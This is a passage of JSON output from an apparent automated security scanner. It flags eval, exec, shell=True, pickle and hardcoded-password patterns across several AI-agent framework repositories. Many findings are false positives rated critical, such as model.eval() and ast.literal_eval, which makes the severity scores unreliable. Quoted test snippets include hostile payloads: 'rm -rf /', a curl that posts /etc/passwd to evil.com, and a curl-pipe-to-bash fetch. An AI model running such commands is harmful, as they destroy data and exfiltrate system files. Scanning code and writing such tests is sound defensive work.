      "context": "            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"eval('__import__(\\\"subprocess\\\").call([\\\"malicious_command\\\"])')\",\n            \"open('/etc/passwd').read()\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 67,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            with pytest.raises((ValueError, SyntaxError, SecurityError)):\n                SafeCodeExecutor.safe_eval(payload)\n    "
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 84,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                result = SafeCodeExecutor.safe_eval(expression)\n                assert result is not None"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 132,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"eval('malicious_code')\",\n            \"exec('import subprocess')\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 134,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"exec('import subprocess')\",\n            \"'normal' + eval('malicious')\",\n            \"{'key': eval('dangerous')}\""
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 135,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"'normal' + eval('malicious')\",\n            \"{'key': eval('dangerous')}\"\n        ]"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 499,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for source in secret_sources:\n            result = self._mock_secret_retrieval(source)\n            "
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 515,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \n    def _mock_secret_retrieval(self, source):\n        \"\"\"Mock secure secret retrieval\"\"\""
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 55,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"__import__('os').system('rm -rf /')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"eval('__import__(\\\"subprocess\\\").call([\\\"malicious_command\\\"])')\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 91,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def test_exec_injection_prevention(self):\n        \"\"\"Test that exec() usage is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 95,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"import os; os.system('malicious_command')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\",\n            \"__import__('sys').exit(1)\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 105,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            with pytest.raises((ValueError, SecurityError)):\n                SafeCodeExecutor.safe_exec(code)\n    "
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 121,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                namespace = SafeCodeExecutor.safe_exec(code)\n                assert isinstance(namespace, dict)"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 133,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"eval('malicious_code')\",\n            \"exec('import subprocess')\",\n            \"'normal' + eval('malicious')\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 153,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    def test_subprocess_shell_injection_prevention(self):\n        \"\"\"Test that subprocess shell=True is replaced with safe alternatives\"\"\"\n        # Arrange"
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 94,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        malicious_code_samples = [\n            \"import os; os.system('malicious_command')\",\n            \"exec('import subprocess; subprocess.call([\\\"rm\\\", \\\"-rf\\\", \\\"/\\\"])')\","
    },
    {
      "file": "GENERATED_TESTS\\test_security_comprehensive.py",
      "line": 160,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "            \"whoami; curl -X POST https://evil.com --data @/etc/passwd\",\n            \"python -c 'import os; os.system(\\\"malicious\\\")'\",\n            \"$(curl -s https://evil.com/script.sh | bash)\""
    },
    {
      "file": "lagent\\setup.py",
      "line": 8,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    with open(version_file, encoding='utf-8') as f:\n        exec(compile(f.read(), version_file, 'exec'))\n    return locals()['__version__']"
    },
    {
      "file": "lagent\\docs\\en\\conf.py",
      "line": 28,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "with open(version_file) as f:\n    exec(compile(f.read(), version_file, 'exec'))\n__version__ = locals()['__version__']"
    },
    {
      "file": "lagent\\docs\\zh_cn\\conf.py",
      "line": 28,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "with open(version_file) as f:\n    exec(compile(f.read(), version_file, 'exec'))\n__version__ = locals()['__version__']"
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_interactive.py",
      "line": 92,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            timer(timeout or self.timeout)(self.exec)(command)\n            if self._use_signals else self.exec(command))\n        if ret.status is Status.SUCCESS:"
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_interactive.py",
      "line": 101,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def exec(self, code: str) -> ExecutionResult:\n        \"\"\"Run Python scripts in IPython shell."
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_interactive.py",
      "line": 225,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        tool_return = ActionReturn(args={'text': command}, type=self.name)\n        ret = await self.exec(command, timeout)\n        if ret.status is Status.SUCCESS:"
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_interactive.py",
      "line": 234,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def exec(self, code: str, timeout: int = None) -> ExecutionResult:\n        \"\"\"Asynchronously run Python scripts in IPython shell."
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_manager.py",
      "line": 49,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                i, session_id, code = msg\n                res = self.exec(session_id, code)\n                self.out_q.put((i, session_id, res))"
    },
    {
      "file": "lagent\\lagent\\actions\\ipython_manager.py",
      "line": 52,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def exec(self, session_id, code):\n        try:"
    },
    {
      "file": "lagent\\lagent\\actions\\parser.py",
      "line": 131,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                inputs = literal_eval(inputs)\n            except Exception as exc:"
    },
    {
      "file": "lagent\\lagent\\actions\\python_interpreter.py",
      "line": 30,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def eval_code(self, expr: str) -> Any:\n        return eval(expr, self._global_vars)\n"
    },
    {
      "file": "lagent\\lagent\\actions\\python_interpreter.py",
      "line": 27,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def exec_code(self, code_piece: str) -> None:\n        exec(code_piece, self._global_vars)\n"
    },
    {
      "file": "lagent\\lagent\\actions\\web_browser.py",
      "line": 765,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            resp = ast.literal_eval(resp)\n        return resp.get('Response', dict())"
    },
    {
      "file": "lagent\\lagent\\actions\\web_browser.py",
      "line": 835,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    ):\n        self.searcher = eval(searcher_type)(black_list=black_list, topk=topk, **kwargs)\n        self.fetcher = ContentFetcher(timeout=timeout)"
    },
    {
      "file": "lagent\\lagent\\llms\\huggingface.py",
      "line": 109,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            path, trust_remote_code=True, **model_kwargs)\n        self.model.eval()\n"
    },
    {
      "file": "lagent\\lagent\\llms\\huggingface.py",
      "line": 301,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            path, trust_remote_code=True, **model_kwargs)\n        self.model.eval()\n"
    },
    {
      "file": "llama-agents\\llama_deploy\\apiserver\\deployment.py",
      "line": 176,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        install = await asyncio.create_subprocess_exec(\n            \"pnpm\", \"install\", cwd=installed_path"
    },
    {
      "file": "llama-agents\\llama_deploy\\apiserver\\deployment.py",
      "line": 187,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        self._ui_server_process = await asyncio.create_subprocess_exec(\n            \"pnpm\","
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\DABench.py",
      "line": 372,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def eval(self, id: str, result: str) -> Tuple[str, bool]:\n        \"\"\""
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\DABench.py",
      "line": 404,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    @handle_exception(exception_msg=\"Error evaluating single prediction\", default_return={})\n    def single_eval(self, id: str, prediction: str) -> dict:\n        \"\"\""
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\DABench.py",
      "line": 461,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        for id, prediction in zip(id_list, predictions):\n            correct = self.single_eval(id, prediction)  # Evaluate the single prediction\n            results.append({\"id\": id, \"correctness\": correct})  # Append the result to the list"
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\DABench.py",
      "line": 480,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    prediction = \"@mean_fare[34.65]\"\n    logger.info(bench.eval(id, prediction))\n    ids = [0, 5, 6]"
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\run_InfiAgent-DABench_all.py",
      "line": 23,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            save_history(role=di)\n            temp_prediction, temp_istrue = bench.eval(key, str(result))\n            is_true.append(str(temp_istrue))"
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\run_InfiAgent-DABench_all.py",
      "line": 27,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        except:\n            is_true.append(str(bench.eval(key, \"\")))\n            predictions.append(str(\"\"))"
    },
    {
      "file": "MetaGPT\\examples\\di\\InfiAgent-DABench\\run_InfiAgent-DABench_single.py",
      "line": 17,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    save_history(role=di)\n    _, is_correct = bench.eval(id, str(result))\n    logger.info(f\"Prediction is {'correct' if is_correct else 'incorrect'}.\")"
    },
    {
      "file": "MetaGPT\\metagpt\\repo_parser.py",
      "line": 731,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        output_dir.mkdir(parents=True, exist_ok=True)\n        result = subprocess.run(command, shell=True, check=True, cwd=str(output_dir))\n        if result.returncode != 0:"
    },
    {
      "file": "MetaGPT\\metagpt\\actions\\action_node.py",
      "line": 581,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        extracted_data[field_name] = eval(raw_value)\n                        if not isinstance(extracted_data[field_name], list):"
    },
    {
      "file": "MetaGPT\\metagpt\\actions\\action_node.py",
      "line": 588,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        extracted_data[field_name] = eval(raw_value)\n                        if not isinstance(extracted_data[field_name], dict):"
    },
    {
      "file": "MetaGPT\\metagpt\\actions\\run_code.py",
      "line": 87,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            namespace = {}\n            exec(code, namespace)\n        except Exception as e:"
    },
    {
      "file": "MetaGPT\\metagpt\\actions\\skill_action.py",
      "line": 78,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            key = keyword.arg\n            value = ast.literal_eval(keyword.value)\n            args[key] = value"
    },
    {
      "file": "MetaGPT\\metagpt\\environment\\android\\android_ext_env.py",
      "line": 42,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    file_path = download_model(file_url, target_folder)\n    groundingdino_model = load_model(file_path, device=device).eval()\n    return ocr_detection, ocr_recognition, groundingdino_model"
    },
    {
      "file": "MetaGPT\\metagpt\\environment\\android\\android_ext_env.py",
      "line": 139,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        adb_cmd = adb_cmd.replace(\"\\\\\", \"/\")\n        res = subprocess.run(adb_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        exec_res = ADB_EXEC_FAIL"
    },
    {
      "file": "MetaGPT\\metagpt\\environment\\android\\text_icon_localization.py",
      "line": 269,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    print(load_res)\n    _ = model.eval()\n    return model"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\benchmark\\humaneval.py",
      "line": 77,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            exec(solution, global_dict)\n"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\benchmark\\humaneval.py",
      "line": 82,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            exec(test, global_dict)\n"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\benchmark\\mbpp.py",
      "line": 58,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            exec(solution, global_dict)\n"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\benchmark\\mbpp.py",
      "line": 63,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n            exec(test, global_dict)\n"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\scripts\\operator.py",
      "line": 148,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # Use exec to execute the code\n        exec(code, global_namespace)\n        # Assume the code defines a function named 'solve'"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\aflow\\scripts\\operator.py",
      "line": 228,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                exec(test_code, globals())\n            except AssertionError as e:"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\android_assistant\\actions\\parse_record.py",
      "line": 88,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    try:\n                        doc_content = ast.literal_eval(doc_path.read_text())\n                    except Exception as exp:"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\android_assistant\\actions\\screenshot_parse.py",
      "line": 67,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                doc_content = ast.literal_eval(doc_path.read_text())\n            except Exception as exp:"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\android_assistant\\actions\\self_learn_and_reflect.py",
      "line": 219,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    doc_content = ast.literal_eval(doc_path.read_text())\n                except Exception as exp:"
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\sela\\search\\tree_search.py",
      "line": 42,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            - role_timeout (int): The timeout for the role.\n            - external_eval (bool): Whether to use external evaluation.\n            - custom_dataset_dir (str): The directory of the custom dataset."
    },
    {
      "file": "MetaGPT\\metagpt\\ext\\sela\\search\\tree_search.py",
      "line": 3,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import os\nimport pickle\nimport shutil"
    },
    {
      "file": "MetaGPT\\metagpt\\roles\\di\\swe_agent.py",
      "line": 59,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if self.run_eval:\n            self._parse_commands_for_eval()\n        return message"
    },
    {
      "file": "MetaGPT\\metagpt\\roles\\di\\swe_agent.py",
      "line": 62,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    async def _parse_commands_for_eval(self):\n        \"\"\""
    },
    {
      "file": "MetaGPT\\metagpt\\strategy\\tot.py",
      "line": 66,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        thoughts = CodeParser.parse_code(text=rsp)\n        thoughts = eval(thoughts)\n        # fixme \u907f\u514d\u4e0d\u8ddf\u968f\uff0c\u751f\u6210\u8fc7\u591anodes"
    },
    {
      "file": "MetaGPT\\metagpt\\tools\\web_browser_engine_playwright.py",
      "line": 116,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            return\n        process = await asyncio.create_subprocess_exec(\n            sys.executable,"
    },
    {
      "file": "MetaGPT\\metagpt\\tools\\libs\\shell.py",
      "line": 51,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    cwd = str(cwd) if cwd else None\n    shell = True if isinstance(command, str) else False\n    result = subprocess.run(command, cwd=cwd, capture_output=True, text=True, env=env, timeout=timeout, shell=shell)"
    },
    {
      "file": "MetaGPT\\metagpt\\tools\\libs\\terminal.py",
      "line": 39,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # Start a persistent shell process\n        self.process = await asyncio.create_subprocess_exec(\n            *self.shell_command,"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\common.py",
      "line": 122,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Convert string representation of list to a Python list using ast.literal_eval.\n            tasks = ast.literal_eval(tasks_list_str)\n        else:"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\common.py",
      "line": 235,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                # Attempt to convert the text to a Python data type using ast.literal_eval\n                result = ast.literal_eval(structure_text)\n"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\common.py",
      "line": 317,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            # Convert string representation of list to a Python list using ast.literal_eval.\n            tasks = ast.literal_eval(tasks_list_str)\n        else:"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\common.py",
      "line": 63,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        check_command = \"command -v \" + command + ' >/dev/null 2>&1 || { echo >&2 \"no mermaid\"; exit 1; }'\n    result = os.system(check_command)\n    return result"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\serialize.py",
      "line": 56,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        else:\n            new_mapping[key] = eval(value)  # `\"'(list[str], Ellipsis)\"` to `(list[str], ...)`\n    return new_mapping"
    },
    {
      "file": "MetaGPT\\metagpt\\utils\\serialize.py",
      "line": 6,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import copy\nimport pickle\n"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\test_incremental_dev.py",
      "line": 146,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    # Check if the .gitignore exists. If it doesn't exist, create .gitignore and add the comment\n    subprocess.run(f\"echo # Ignore these files or directories > {'.gitignore'}\", shell=True)\n"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\test_reporter.py",
      "line": 78,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    assert callback_data[1][\"name\"] == \"page\"\n    assert ast.literal_eval(callback_data[1][\"value\"]) == img\n"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\tools\\libs\\test_editor.py",
      "line": 737,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    command = f\"cp -rf {str(src_path)} {str(chat_path)}\"\n    os.system(command)\n    filenames = list_files(chat_path)"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\tools\\libs\\test_editor.py",
      "line": 748,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    command = f\"cp -rf {str(src_path)} {str(UPLOAD_ROOT)}\"\n    os.system(command)\n    filenames = list_files(UPLOAD_ROOT)"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\tools\\libs\\test_editor.py",
      "line": 803,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    save_to.parent.mkdir(parents=True, exist_ok=True)\n    os.system(f\"cp {str(filename)} {str(save_to)}\")\n"
    },
    {
      "file": "MetaGPT\\tests\\metagpt\\utils\\test_redis.py",
      "line": 27,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    mock_config.username = \"mockusername\"\n    mock_config.password = \"mockpwd\"\n    mock_config.db = \"0\""
    },
    {
      "file": "MetaGPT\\tests\\mock\\mock_aiohttp.py",
      "line": 14,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr):\n            try:"
    },
    {
      "file": "MetaGPT\\tests\\mock\\mock_aiohttp.py",
      "line": 16,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                return ast.literal_eval(expr)\n            except (ValueError, SyntaxError):"
    },
    {
      "file": "MetaGPT\\tests\\mock\\mock_aiohttp.py",
      "line": 67,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        if self.key in self.rsp_cache:\n            return SafeCodeExecutor.safe_eval(self.rsp_cache[self.key])\n        data = await self.response.content.read()"
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\manual_assistants\\doc_parser.py",
      "line": 71,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        type_parts.remove(\"optional\")\n    type_info[\"type\"] = eval(type_parts[0].strip())\n    return type_info"
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\manual_assistants\\doc_parser.py",
      "line": 107,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                    parsed_elements[prefix][\"description\"] = field_body\n                    parsed_elements[prefix][\"type\"] = eval(exception_type)\n                elif prefix == \"return\":"
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_creator.py",
      "line": 58,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # add the function to the assistant details\n        functions.update({func: eval(func)})\n"
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_creator.py",
      "line": 55,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # define the function in this execution environment\n        exec(functions[func], globals())\n    "
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_user.py",
      "line": 59,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        functions.update({func: eval(func)})\n"
    },
    {
      "file": "OpenAI_Agent_Swarm\\agents\\tool_maker\\tool_user.py",
      "line": 57,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        with open('tools/' + func + '.py') as f:\n            namespace = SafeCodeExecutor.safe_exec(f.read()); globals().update(namespace)\n"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\filters\\filtering_surrealdb.py",
      "line": 13,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "SURREALDB_USER = \"root\"\nSURREALDB_PASSWORD = \"root\"\nSURREALDB_NAMESPACE = \"test\""
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\clickhouse_db\\async_clickhouse.py",
      "line": 17,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            username=\"ai\",\n            password=\"ai\",\n        ),"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\clickhouse_db\\clickhouse.py",
      "line": 15,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "            username=\"ai\",\n            password=\"ai\",\n        ),"
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\couchbase_db\\async_couchbase_db.py",
      "line": 33,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    export COUCHBASE_USER=\"Administrator\"\n    export COUCHBASE_PASSWORD=\"password\"\n    export COUCHBASE_CONNECTION_STRING=\"couchbase://localhost\""
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\couchbase_db\\couchbase_db.py",
      "line": 33,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    export COUCHBASE_USER=\"Administrator\"\n    export COUCHBASE_PASSWORD=\"password\"\n    export COUCHBASE_CONNECTION_STRING=\"couchbase://localhost\""
    },
    {
      "file": "phidata\\cookbook\\agent_concepts\\knowledge\\vector_dbs\\surrealdb\\async_surreal_db.py",
      "line": 15,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "SURREALDB_USER = \"root\"\nSURREALDB_PASSWORD = \"root\"\nSURREALDB_NAMESPACE = \"test\""
    },
    {
